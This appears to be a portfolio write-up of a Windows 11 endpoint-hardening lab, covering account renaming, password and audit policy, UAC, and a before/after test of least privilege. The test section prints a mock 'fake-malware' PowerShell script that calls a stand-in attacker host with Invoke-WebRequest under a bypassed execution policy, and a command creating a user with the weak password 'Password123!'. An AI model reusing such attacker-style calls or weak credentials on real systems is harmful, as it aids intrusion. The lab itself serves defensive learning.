## Account Control

### Renamed Default Administrator Account
- **Why:** Obfuscates a high-value target account frequently exploited by attackers
- **Command:**
  ```powershell
  Rename-LocalUser -Name "Administrator" -NewName "svc_sysmgr"
  ```
- **Verification:**  
  ```powershell
  net user
  ```  
   ![Admin Rename](./images/admin_rename.png)

---

### Disabled Guest Account
- **Why:** Prevents unauthenticated logons via built-in low-privilege account
- **Command:**
  ```powershell
  Disable-LocalUser -Name "Guest"
  ```
- **Verification:**
  ```powershell
  net user Guest
  ```  
  Look for `Account active: No`  

 ![Disable Guest](./images/disable_guest.png)

---

### Created Standard User Account
- **Why:** Enforces least privilege for daily tasks
- **Commands:**
  ```powershell
  net user TestUser Password123! /add
  net localgroup Users TestUser /add
  net localgroup Administrators TestUser /delete
  ```
- **Verification:** Group membership before/after

## Password Policy

### Enforced Strong Password Requirements
- **Min length:** `12`
- **Complexity:** Enabled (uppercase, lowercase, number, symbol)
- **Password history:** 12 remembered
- **Min age:** 1 day
- **Max age:** left at default (42 days)
- **How:**  
  `gpedit.msc ‚Üí Computer Configuration ‚Üí Windows Settings ‚Üí Security Settings ‚Üí Account Policies ‚Üí Password Policy`  
![Password Before](./images/gpo_password_policy_before.png)
![Password After](./images/gpo_password_policy_after.png)

---

### Enabled Password Length Auditing

- **What:** Set `Minimum password length audit` to `16`

- **Why:**  
  This setting allows the system to **log when users create or change passwords shorter than 16 characters**, without enforcing that as a requirement. It‚Äôs useful for **gathering insight into password behavior** before implementing stricter policies.

  By auditing rather than enforcing, administrators can:
  - Measure compliance risk before raising the minimum
  - Avoid user disruption from sudden policy shifts
  - Phase in stronger password requirements with supporting data

  In this lab, the enforced minimum is 12 characters, but auditing at 16 simulates how an organization might evaluate readiness for a more secure baseline.


---

### Disabled Insecure Options
- **Reversible encryption:** Disabled  
- **Relax minimum length enforcement:** Disabled  

---

## User Account Control (UAC)

### Raised UAC Settings
- **Change:** ‚ÄúNever notify‚Äù ‚Üí ‚ÄúAlways notify‚Äù
- **Why:** Ensures elevation prompts appear for all privileged actions
- **How:**  
  `Control Panel ‚Üí User Accounts ‚Üí Change User Account Control settings`

## Audit Policy Configuration

### Enabled Local Security Audit Policies

Audit settings were applied to monitor key system and account-level activities on a standalone Windows 11 Pro machine. These policies support incident detection, troubleshooting, and accountability ‚Äî particularly around user authentication, privilege use, and system changes.

The following audit categories were enabled:

| Policy               | Setting           | Purpose |
|----------------------|-------------------|---------|
| **Account logon events** | Success, Failure | Tracks authentication attempts using local or cached credentials (e.g., RDP, remote access). |
| **Account management**   | Success           | Captures user and group account creation, deletion, renaming, and password resets. |
| **Logon events**         | Success, Failure | Monitors interactive, network, and remote desktop logons. |
| **Policy change**        | Success           | Logs changes to audit policies, trust settings, or user rights assignments. |
| **Privilege use**        | Failure           | Detects attempts to use sensitive privileges without authorization. |
| **Process tracking**     | Success           | Records process creation and termination events ‚Äî useful for tracing script or payload execution. |
| **System events**        | Success           | Logs system startups, shutdowns, crashes, and security log tampering. |

### Notes

Audit events were selected to balance signal-to-noise and reflect real-world audit baselines aligned with CIS and NIST guidance. This configuration provides foundational visibility for a Tier 1 or Tier 2 support environment, without overwhelming log volume.

Audit categories specific to domain infrastructure or high-noise object tracking (such as Directory Service Access and Object Access) were intentionally excluded, as they are not relevant to this standalone lab and would add unnecessary complexity without benefit.

## Simulated Payload Test (Before vs. After)

### Purpose
To evaluate how user privilege separation and UAC enforcement affect the execution of a potentially malicious PowerShell script ‚Äî simulating an initial access attempt commonly observed in real-world attacks.

### Method
A harmless PowerShell script was created to mimic suspicious behavior ‚Äî including a staged outbound HTTP request:

```powershell
# fake-malware.ps1
Write-Output "Connecting to attacker..."
Start-Sleep -Seconds 2
Invoke-WebRequest http://malicious.example.com -UseBasicParsing
Write-Output "Payload delivered."
```

The domain was intentionally unreachable to simulate a network failure and keep the test safe while demonstrating behavior.

---

### Before Hardening

- Executed under the built-in **administrator account**
- PowerShell **execution policy was bypassed**
- Script ran without restrictions or UAC prompt
- Outbound web request was attempted (DNS resolution failed, as expected)
- Ran with **full administrative privileges**, which in a real-world scenario would allow system compromise

![Admin Exec](./images/fake_payload_admin_exec.png)

---

### After Hardening

- Executed under a **standard (non-admin) user account**
- PowerShell execution policy was still bypassed, but UAC **did not trigger**, since elevation was not requested
- The script ran and failed at the same network call, but this time:
  - It was **confined to a restricted user context**
  - **Could not modify system settings**, install software, or affect other users
- Demonstrated **least privilege containment** even when execution wasn‚Äôt explicitly blocked

![Standard Exec](./images/fake_standard_user_exec.png)

---

### Key Difference

While both script executions produced similar output, the **after-hardening test limited the potential damage** by enforcing least privilege. In a real-world attack, the same script might install malware or alter system settings ‚Äî but with these controls in place, its impact is sharply reduced.

---

## Lessons Learned

- **Least privilege is the first line of containment.** Even though the payload executed, the fact that it ran under a non-admin account prevented it from making system-level changes ‚Äî a real-world win in endpoint security.

- **UAC and account separation work best in tandem.** The lack of a UAC prompt under a standard user account reinforced that elevation boundaries were respected and that no silent privilege escalation occurred.

- **Not all threats are loud.** The script didn't cause visible damage, but its behavior still demonstrated tactics used in early-stage attacks ‚Äî highlighting the value of controlling even ‚Äúminor‚Äù execution pathways.

- **Documentation turns small wins into big signals.** While this test didn‚Äôt result in blocked execution, the act of tracing, isolating, and interpreting system response proved the machine was hardened against real risks.

- **Successful hardening often feels uneventful.** The best security controls are invisible when working correctly ‚Äî they don‚Äôt block productivity, but quietly prevent escalation and system compromise behind the scenes.

## Conclusion

This lab simulates common endpoint hardening tasks in a Windows 11 Pro environment, executed without domain infrastructure. Though foundational, these controls form the baseline for defense-in-depth strategies and reflect real-world configurations used in help desk, desktop support, and SOC environments.

This project demonstrates practical experience with:
- PowerShell administration
- Group Policy configuration
- Privilege management
- UAC tuning
- Scripted security testing
- Technical documentation
